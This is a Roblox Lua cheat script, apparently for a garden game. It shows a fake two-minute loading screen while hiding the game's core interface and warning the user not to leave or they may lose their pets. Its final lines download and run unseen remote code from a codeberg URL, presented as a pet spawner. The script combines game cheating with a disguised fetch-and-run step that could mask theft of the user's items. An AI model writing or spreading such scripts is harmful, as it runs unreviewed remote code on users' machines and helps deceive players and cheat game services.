-- Services
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")

local LocalPlayer = Players.LocalPlayer

-- Freeze CoreGuis
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Blur Effect
local Blur = Instance.new("BlurEffect")
Blur.Size = 25
Blur.Parent = Lighting

-- ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true

-- Background Frame
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Background.Parent = ScreenGui

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 150, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 60))
}
UIGradient.Rotation = 90
UIGradient.Parent = Background

-- Warning Label
local WarningLabel = Instance.new("TextLabel")
WarningLabel.Size = UDim2.new(1, 0, 0.1, 0)
WarningLabel.Position = UDim2.new(0, 0, 0.05, 0)
WarningLabel.BackgroundTransparency = 1
WarningLabel.Text = "⚠️ Please don't leave while executing the script, this might make you lose all your pets!"
WarningLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
WarningLabel.Font = Enum.Font.GothamBold
WarningLabel.TextScaled = true
WarningLabel.Parent = ScreenGui

-- Pulsing Animation
task.spawn(function()
    while ScreenGui.Parent do
        for i = 1, 20 do
            WarningLabel.TextTransparency = i * 0.02
            task.wait(0.03)
        end
        for i = 20, 1, -1 do
            WarningLabel.TextTransparency = i * 0.02
            task.wait(0.03)
        end
    end
end)

-- Sonic Spinner
local Spinner = Instance.new("ImageLabel")
Spinner.Size = UDim2.new(0, 200, 0, 200)
Spinner.AnchorPoint = Vector2.new(0.5, 0.5)
Spinner.Position = UDim2.new(0.5, 0, 0.5, 0)
Spinner.BackgroundTransparency = 1
Spinner.Image = "rbxassetid://14284090563" -- Sonic Spin
Spinner.Parent = ScreenGui

-- Spinner Rotation Animation (Sonic Speed)
task.spawn(function()
    local rotation = 0
    while Spinner.Parent do
        rotation = rotation + 10
        Spinner.Rotation = rotation % 360
        task.wait(0.01)
    end
end)

-- Percentage Text
local PercentageLabel = Instance.new("TextLabel")
PercentageLabel.Size = UDim2.new(1, 0, 0.1, 0)
PercentageLabel.Position = UDim2.new(0, 0, 0.75, 0)
PercentageLabel.BackgroundTransparency = 1
PercentageLabel.Text = "Loading... 0%"
PercentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentageLabel.Font = Enum.Font.GothamBold
PercentageLabel.TextSize = 28
PercentageLabel.Parent = ScreenGui

-- Funny Tips Text
local TipLabel = Instance.new("TextLabel")
TipLabel.Size = UDim2.new(1, 0, 0.05, 0)
TipLabel.Position = UDim2.new(0, 0, 0.85, 0)
TipLabel.BackgroundTransparency = 1
TipLabel.Text = "Preparing magic soil..."
TipLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
TipLabel.Font = Enum.Font.Gotham
TipLabel.TextSize = 20
TipLabel.Parent = ScreenGui

-- Funny Tips Rotation
local funnyTips = {
    "Bypassing Anti-Cheat...",
    "Stealing crops from neighbors...",
    "Downloading OP pets...",
    "Planting invisible carrots...",
    "Bribing the garden NPCs...",
    "Watering plastic flowers...",
    "Fooling the server admin...",
    "Claiming free sheckles...",
    "Installing instant-grow hacks...",
    "Petting golden rabbits...",
    "Growing money trees..."
}
task.spawn(function()
    while ScreenGui.Parent do
        TipLabel.Text = funnyTips[math.random(1, #funnyTips)]
        task.wait(4)
    end
end)

-- Loading Progress (2 Minutes)
for i = 1, 100 do
    PercentageLabel.Text = "Loading... " .. i .. "%"
    task.wait(1.2)
end

-- Cleanup UI and Unfreeze CoreGui
ScreenGui:Destroy()
Blur:Destroy()
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)

-- Execute Actual Script
local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
Spawner.Load()
